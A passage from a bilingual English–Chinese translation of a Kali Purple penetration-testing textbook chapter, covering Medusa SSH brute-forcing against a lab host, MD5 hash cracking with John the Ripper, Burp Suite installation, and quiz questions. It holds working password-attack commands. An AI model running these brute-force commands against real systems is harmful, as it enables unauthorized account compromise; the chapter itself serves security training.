  zh: '**Medusa** 是一个与 Hydra 功能非常相似的工具。它默认不在 Kali 菜单中，但在从命令行安装后，会出现在 **密码攻击** 下。现在请执行这一步。输入
    **sudo apt update**，然后如果你愿意，可以输入 **sudo apt upgrade**。完成后，输入命令正式安装 Medusa，也就是输入
    **sudo apt install medusa**。由于我们已经完成了设置 Hydra 的繁琐工作，这一步会更快。安装完后，假设你的 SSH 服务器仍然运行，你几乎可以立即发起攻击。要检查服务器状态，输入
    **sudo systemctl status ssh**；如果它没有运行，重新输入该命令，将 **status** 替换为 **start**。然后，输入以下命令发起攻击：**medusa
    -h 10.0.2.15 -u karllane -P /home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt
    -****M ssh**。'
- en: 'As you will discover, the process is lightning-fast. If successful, you should
    see the result shown in *Figure 10**.22*:'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你将发现的那样，破解过程非常快速。如果成功，你应该会看到 *图 10.22* 中的结果：
- en: '![Figure 10.22 – Medusa – successful password crack against our Kali Purple
    SSH server](image/B21223_10_22.jpg)'
  id: totrans-248
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.22 – Medusa – 成功破解我们的 Kali Purple SSH 服务器密码](image/B21223_10_22.jpg)'
- en: Figure 10.22 – Medusa – successful password crack against our Kali Purple SSH
    server
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.22 – Medusa – 成功破解我们的 Kali Purple SSH 服务器密码
- en: Next, we’ll cover John the Ripper.
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将介绍 John the Ripper。
- en: John the Ripper
  id: totrans-251
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: John the Ripper
- en: '**John the Ripper** is a very well-known and popular password-cracking tool.
    It’s often utilized by security professionals and pentesters to test the strength
    of passwords as well as conduct security assessments for organizations. It is
    an incredibly versatile password-cracking tool in that it supports a wide range
    of cryptographic hash algorithms and password formats.'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: '**John the Ripper** 是一个非常著名和流行的密码破解工具。它通常被安全专家和渗透测试员用来测试密码的强度，并为组织进行安全评估。它是一个功能极其多样的密码破解工具，支持多种加密哈希算法和密码格式。'
- en: To use John the Ripper, select the Kali dragon icon in the top-left corner of
    our environment and either type **john** in the search bar or scroll down and
    highlight **Password Attacks**. Then, move your cursor to the newly expanded column
    on the right-hand side and click on the **John the** **Ripper** option.
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用 John the Ripper，请在环境的左上角选择 Kali 龙图标，然后在搜索栏中输入 **john** 或者向下滚动并高亮显示 **密码攻击**。接着，将光标移至右侧新展开的栏目并点击
    **John the** **Ripper** 选项。
- en: To install it from the command line, type **sudo apt update** and then **sudo
    apt upgrade** if you prefer. Once you’re finished, type the command to formally
    install John the Ripper – that is, **sudo apt** **install john**.
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 从命令行安装它时，输入 **sudo apt update**，然后如果你愿意，可以输入 **sudo apt upgrade**。完成后，输入命令正式安装
    John the Ripper，也就是输入 **sudo apt install john**。
- en: 'We’ve already attacked our SSH server twice, so let’s do something different
    for the sake of staying awake. Let’s do something John the Ripper is well-known
    for and crack a password hash! First, let’s create a file in which we can store
    our hash. Type **sudo nano hashtest.txt** or whatever you’d like to name it. Just
    remember to type the correct name in the command. In the file, type **37203f0ef82c870c36cd6f99e1fbfe4c**
    as a hash value on the first line, and then press *Ctrl* + *X* to close and save
    the file, selecting *Y* to confirm your choice. Now, enter the command to invoke
    John the Ripper (which comes with a pre-installed password list of its own) and
    run it against the hash value(s) in that file. Type **john –format=raw-md5 hashtest.txt**,
    replacing the actual name of the text file with the name you chose to name your
    file. If all goes well, you will discover that the hash value you placed inside
    that file resolves to the word **valhalla**, as shown in *Figure 10**.23*:'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经攻击过我们的 SSH 服务器两次了，所以为了保持清醒，我们做点不一样的事情吧。让我们做些 **John the Ripper** 擅长的事情，破解一个密码哈希！首先，创建一个文件来存储我们的哈希值。输入
    **sudo nano hashtest.txt** 或者你喜欢的任何名字。只需记住在命令中输入正确的文件名。在文件中，第一行输入 **37203f0ef82c870c36cd6f99e1fbfe4c**
    作为哈希值，然后按 *Ctrl* + *X* 关闭并保存文件，选择 *Y* 来确认你的选择。现在，输入命令来调用 John the Ripper（它自带了一个预安装的密码列表），并用它来破解该文件中的哈希值。输入
    **john –format=raw-md5 hashtest.txt**，将文本文件的实际名称替换为你选择的文件名。如果一切顺利，你会发现你放入文件中的哈希值解析为单词
    **valhalla**，如 *图 10.23* 所示：
- en: '![Figure 10.23 – John the Ripper successfully resolving a hash value from a
    file](image/B21223_10_23.jpg)'
  id: totrans-256
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.23 – John the Ripper 成功破解文件中的哈希值](image/B21223_10_23.jpg)'
- en: Figure 10.23 – John the Ripper successfully resolving a hash value from a file
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.23 – John the Ripper 成功破解文件中的哈希值
- en: Now that we’ve covered packet capture, robust vulnerability scanning, exploit
    usage, and payload delivery with Metasploit, along with password cracking using
    Hydra, Medusa, and John the Ripper, we’re going to bring this chapter full circle
    and go back to web application analysis with ZAP’s chief competition, Burp Suite.
    Like ZAP, Burp Suite offers a plethora of free training but also has a strong
    commercial component to its brand.
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经覆盖了数据包捕获、强大的漏洞扫描、利用攻击和利用 Metasploit 进行有效载荷传递，以及使用 Hydra、Medusa 和 John
    the Ripper 进行密码破解，我们将把本章内容做个总结，回到 web 应用分析，使用 ZAP 的主要竞争对手 Burp Suite。像 ZAP 一样，Burp
    Suite 提供了大量免费的培训，但它也有强大的商业组件。
- en: Burp Suite integration
  id: totrans-259
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Burp Suite 集成
- en: You would be hard-pressed to find a professional web application penetration
    tester who doesn’t use or at least hasn’t heard of Burp Suite. This tool is produced
    by a company called PortSwigger. We talked a bit about the structure of Burp Suite
    in [*Chapter 1*](B21223_01.xhtml#_idTextAnchor013) and encourage you to refer
    to that chapter if you’d like to review it.
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 你很难找到一位不使用或至少没听说过 Burp Suite 的专业 web 应用渗透测试人员。这个工具由一个名为 PortSwigger 的公司开发。我们在
    [*第 1 章*](B21223_01.xhtml#_idTextAnchor013) 中稍微讨论了 Burp Suite 的结构，如果你想复习的话，可以参考那一章。
- en: 'Let’s quickly grab a copy and set it up for you to play with. Within your Kali
    Purple instance, open a web browser – ideally Firefox, in this case – and go to
    [https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install).
    Then, scroll down until you see the **Choose your software** options under the
    **Download** section, as shown in *Figure 10**.24*. Select the **Community** **Edition**
    option:'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们快速下载并为你设置好可以使用的版本。在你的 Kali Purple 实例中，打开一个浏览器——在这种情况下最好是 Firefox——并访问 [https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)。然后向下滚动，直到看到
    **下载** 部分下的 **选择你的软件** 选项，如 *图 10.24* 所示。选择 **Community** **Edition** 版本：
- en: '![Figure 10.24 – Burp Suite download](image/B21223_10_24.jpg)'
  id: totrans-262
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.24 – Burp Suite 下载](image/B21223_10_24.jpg)'
- en: Figure 10.24 – Burp Suite download
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.24 – Burp Suite 下载
- en: 'The website should identify your operating system and present the correct option
    by default. If it doesn’t, you can select the drop-down menu where the operating
    system is listed and select the appropriate operating system to download the correct
    Burp Suite option. You should also click on the **show checksums** link to the
    right of the download button and record those values. When you do, the checksums
    will be presented to you and the button will change to **hide checksums** (highlighted
    in *Figure 10**.25*). Record those values:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 网站应该能自动识别你的操作系统，并默认提供正确的下载选项。如果没有，你可以选择操作系统列表中的下拉菜单，并选择合适的操作系统以下载正确的 Burp Suite
    版本。你还需要点击下载按钮右侧的**显示校验和**链接，并记录下那些值。这样，校验和会显示出来，按钮也会变成**隐藏校验和**（如*图 10.25*所示）。记录下这些值：
- en: '![Figure 10.25 – Burp Suite download options and checksums](image/B21223_10_25.jpg)'
  id: totrans-265
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.25 – Burp Suite 下载选项和校验和](image/B21223_10_25.jpg)'
- en: Figure 10.25 – Burp Suite download options and checksums
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.25 – Burp Suite 下载选项和校验和
- en: 'Within your command terminal, navigate to your **Downloads** folder by typing
    **cd /Downloads** and type **ls** by itself to confirm that the download is present.
    There should be a file with a name that is similar to **burpsuite_community_linux_v2024_2_1_5.sh**,
    with the year and version numbers after it differing, depending on when you’re
    reading this. *Figure 10**.26* shows that there are two file hashes to choose
    from. You only need to use one to confirm that the download was unaltered. To
    confirm SHA256, you would type **sha256 burpsuite_community_linux_v2024_2_1_5.sh**;
    to confirm the MD5 hash, you would type **md5sum burpsuite_community_linux_v2024_2_1_5.sh**.
    Whichever option you choose, compare the resulting value, as shown in *Figure
    10**.26*, with the value you recorded from the Burp Suite download page:'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 在你的命令终端中，输入**cd /Downloads**进入**下载**文件夹，并输入**ls**来确认下载文件是否存在。你应该看到一个文件，文件名类似于**burpsuite_community_linux_v2024_2_1_5.sh**，其中年份和版本号可能会有所不同，具体取决于你查看本文的时间。*图
    10.26* 显示了有两个文件哈希值可以选择。你只需要使用其中一个来确认下载文件是否未被篡改。若要确认 SHA256，可以输入**sha256 burpsuite_community_linux_v2024_2_1_5.sh**；若要确认
    MD5 哈希，可以输入**md5sum burpsuite_community_linux_v2024_2_1_5.sh**。无论你选择哪个选项，都要将生成的值与*图
    10.26*中显示的值进行比较，确保与从 Burp Suite 下载页面记录的值一致：
- en: '![Figure 10.26 – Burp Suite checksum confirmation at the command line](image/B21223_10_26.jpg)'
  id: totrans-268
  prefs: []
  type: TYPE_IMG
  zh: '![图 10.26 – Burp Suite 校验和在命令行中的确认](image/B21223_10_26.jpg)'
- en: Figure 10.26 – Burp Suite checksum confirmation at the command line
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.26 – Burp Suite 校验和在命令行中的确认
- en: Since we’re reaching the end of our journey together, we’re going to show you
    a shortcut to launching the application while simultaneously making sure it has
    the necessary file permissions for us to launch. Combine **chmod** and launch
    the application by running **sudo chmod +x burpsuite_community_linux_v2024_2_1_5.sh
    && ./****burpsuite_community_linux_v2024_2_1_5.sh**.
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 由于我们快要结束这段旅程了，现在将向你展示一个快捷方式来启动应用程序，同时确保它具有启动所需的文件权限。将**chmod**与启动命令结合，运行**sudo
    chmod +x burpsuite_community_linux_v2024_2_1_5.sh && ./burpsuite_community_linux_v2024_2_1_5.sh**。
- en: You should see a pop-up window called **Burp Suite Community Edition Setup Wizard**.
    Go ahead with the process of installing it by selecting the **Next >** button.
    You’ll see several screens, each with options for customization. Select **Next
    >** on each screen until you get to the final screen, where you will have the
    option to select **Finish**. Do this to allow the wizard to begin extracting the
    Burp Suite files.
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: 你应该会看到一个名为**Burp Suite Community Edition 安装向导**的弹窗。点击**下一步 >**按钮，继续安装过程。在接下来的几个界面中，会有一些自定义选项。每个界面上选择**下一步
    >**，直到最后一个界面，你将看到一个选项让你选择**完成**。点击它以开始提取 Burp Suite 文件。
- en: Once you’re finished, you can launch Burp Suite similarly to how we’ve launched
    other applications in this chapter. As a reminder, to do so, go to the Kali dragon
    icon in the top-left portion of your Purple instance and either type **Burp**
    **Suite** in the search bar or scroll down to **All Applications** and observe
    the application populate in the window that expands to the right. Furthermore,
    you can try to invoke Burp Suite by simply typing **burpsuite** at the command
    line. However, this shortcut is not usually included in Kali Linux by default.
    So, you may be asked to install it either by selecting **Y** for yes and letting
    automation do it or by typing the full **sudo apt install burpsuite** command
    at the command line. Please note that this won’t install Burp Suite itself since
    you’ve already done that! This is only installing the command to invoke Burp Suite
    from the command line and the name of that command is simply **burpsuite**.
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 完成后，你可以像我们在这一章中启动其他应用程序一样启动Burp Suite。提醒一下，要做到这一点，进入你Purple实例左上角的Kali龙图标，在搜索栏中输入**Burp**
    **Suite**，或者滚动到**所有应用程序**并观察应用程序在右侧扩展的窗口中显示出来。此外，你也可以尝试通过在命令行中直接输入**burpsuite**来启动Burp
    Suite。然而，默认情况下，Kali Linux通常不包括这个快捷方式。所以，系统可能会要求你安装它，你可以选择**Y**（是）让自动化完成，或者在命令行中输入完整的**sudo
    apt install burpsuite**命令。请注意，这不会重新安装Burp Suite，因为你已经完成了安装！这只是安装了一个从命令行调用Burp
    Suite的命令，而这个命令的名称就是**burpsuite**。
- en: Once you’ve installed this command, you can type **burpsuite** at the command
    line to launch the application. Once you’ve done that, we recommend accepting
    the default values throughout the application launch process as a temporary project.
    The reason is that this will take you to the default dashboard where PortSwigger
    has provided a plethora of getting started material, video tutorials, guided tours,
    and a web academy. This product itself could be taught over a couple of college-level
    courses. These videos provide instruction far better than anything we could print
    here. If offensive security and pentesting are your things, we highly recommend
    taking the time to learn and master Burp Suite, and starting with these videos
    is about the best training you’ll get. It’s worth mentioning that while there
    is some fee-based training, plenty of *free* training is provided here!
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你安装了这个命令，你可以在命令行中输入**burpsuite**来启动应用程序。完成后，我们建议在整个应用程序启动过程中接受默认值，作为一个临时项目。原因是，这将把你带到默认仪表板，在那里PortSwigger提供了大量的入门材料、视频教程、引导式游览和网络学院。这个产品本身可以作为几门大学级课程来教授。这些视频提供的指导远远优于我们在这里能打印的任何内容。如果你对攻击性安全和渗透测试感兴趣，我们强烈推荐花时间学习并掌握Burp
    Suite，开始时观看这些视频将是你能得到的最佳培训。值得一提的是，虽然有一些收费培训，但这里提供了大量*免费的*培训资源！
- en: Let’s take a look at what we’ve learned in this chapter!
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看看这一章我们学到了什么！
- en: Summary
  id: totrans-275
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, you continued to dig deeply into various red team tools and
    learned how to use them against cyber defenses. In a production setting, the SSH
    server we attacked would’ve had agents of some sort monitoring the activity and
    reporting that activity back to our blue team utilities. Data would’ve been gathered,
    enriched, and stored; then, when an analyst was ready, it would have been displayed
    through the ELK stack or perhaps one of the IDS/IPS solutions we’ve covered.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一章中，你继续深入挖掘了各种红队工具，并学习了如何将它们用来对抗网络防御。在生产环境中，我们攻击的SSH服务器将会有某种代理在监控活动，并将这些活动报告回我们的蓝队工具。数据会被收集、丰富和存储；然后，当分析师准备好时，它将通过ELK堆栈或我们已覆盖的某些IDS/IPS解决方案显示出来。
- en: In this chapter, we looked at some powerful web application utilities that can
    be used for vulnerability management to help us enhance the overall security of
    our web applications. We also explored a variety of reconnaissance and gaining
    access tools with our plethora of scanners and password-cracking utilities. This
    was just a taste, folks. These are the tools that Kali Purple was built to inherently
    support. That does not by any means suggest they are the only tools that could
    be of use within the Kali Purple environment – the Kali Linux operating system
    is designed to accommodate the customized contributions of others. That’s what
    keeps any software community running strong.
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们介绍了一些强大的 Web 应用程序工具，这些工具可以用于漏洞管理，帮助我们增强 Web 应用程序的整体安全性。我们还探讨了各种侦察和获取访问权限的工具，并使用了大量扫描器和密码破解工具。这只是一个小小的尝试，朋友们。这些是
    Kali Purple 天生支持的工具。但这并不意味着它们是 Kali Purple 环境中唯一有用的工具——Kali Linux 操作系统旨在容纳其他人定制的贡献。这也是软件社区能保持活力的原因。
- en: In the next chapter – our final chapter, we are going to assemble some of the
    odds-and-ends features of Kali Purple that didn’t fully belong in the other areas.
    This should bring you to the end of your journey and complete your introduction
    to Kali Purple.
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章——我们最后一章，我们将汇总一些 Kali Purple 中的零散功能，这些功能在其他章节中没有完全涵盖。这应该能带你走到旅程的尽头，并完成对
    Kali Purple 的介绍。
- en: Questions
  id: totrans-279
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: 'Answer the following questions to test your knowledge of this chapter:'
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 回答以下问题，以测试你对本章的理解：
- en: Which stage of a cyberattack would be using the scanning tools we discussed
    belong to?
  id: totrans-281
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们讨论的扫描工具属于网络攻击的哪个阶段？
- en: Payload delivery
  id: totrans-282
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Payload 传输
- en: Exploitation
  id: totrans-283
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 利用
- en: Recovery
  id: totrans-284
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 恢复
- en: Reconnaissance
  id: totrans-285
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 侦察
- en: What is Wireshark?
  id: totrans-286
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 什么是 Wireshark？
- en: A protocol analyzer
  id: totrans-287
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 协议分析仪
- en: A Mafia-linked loan officer
  id: totrans-288
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一位与黑手党相关的贷款官员
- en: A physical cable tap
  id: totrans-289
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个物理电缆监听器
- en: A network packet generator
  id: totrans-290
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个网络数据包生成器
- en: What is John the Ripper?
  id: totrans-291
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 什么是 John the Ripper？
- en: Jack’s older brother
  id: totrans-292
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Jack 的哥哥
- en: A password and hash-cracking utility
  id: totrans-293
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个密码和哈希破解工具
- en: A network packet disassembler
  id: totrans-294
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个网络数据包反汇编器
- en: A WAF bypass exploit
  id: totrans-295
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一个 WAF 绕过漏洞
- en: What do you suppose would happen if the password you are trying to crack isn’t
    on the wordlist that’s being invoked by your cracking utility?
  id: totrans-296
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果你尝试破解的密码不在正在调用的破解工具的词表中，你认为会发生什么？
- en: The utility will automatically restart using values from the next wordlist in
    the directory
  id: totrans-297
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该工具将自动重启，并使用目录中下一个词表的值
- en: The utility will complete the scan from the wordlist and then just make random
    stuff up, trying to guess the password
  id: totrans-298
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该工具将从词表中完成扫描，然后随机生成内容，尝试猜测密码
- en: The password will not be successfully cracked, and you’ll need to find another
    list or method to complete your objective
  id: totrans-299
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 密码将无法成功破解，你需要找到另一份列表或方法来完成目标
- en: The password-cracking utility will become enraged and automatically switch to
    brute force via dictionary and fuzz value testing
  id: totrans-300
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: 密码破解工具会变得异常激烈，并自动切换到通过字典和模糊值测试的暴力破解方式
- en: Which utility is most like ZAP?
  id: totrans-301
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 哪个工具最像 ZAP？
- en: Google Chrome
  id: totrans-302
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Google Chrome
- en: Mozilla Firefox
  id: totrans-303
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Mozilla Firefox
- en: Portswigger
  id: totrans-304
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Portswigger
- en: Burp Suite
  id: totrans-305
  prefs:
  - PREF_IND
  - PREF_OL
  type: TYPE_NORMAL
  zh: Burp Suite
- en: Further reading
  id: totrans-306
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 深入阅读
- en: 'To learn more about the topics that were covered in this chapter, take a look
    at the following resources:'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: 若要了解更多本章涉及的主题，请参考以下资源：
- en: '**Global Information Assurance Wireshark** **paper**: [https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf)'
  id: totrans-308
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**全球信息保障 Wireshark** **论文**：[https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf)'
- en: '**What Is Wireshark and How Is It** **Used?**: [https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it](https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it)'
  id: totrans-309
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**什么是 Wireshark，如何使用？**：[https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it](https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it)'
- en: '**Tenable’s Nessus vulnerability** **scanner**:  [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)'
  id: totrans-310
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Tenable 的 Nessus 漏洞** **扫描器**：[https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)'
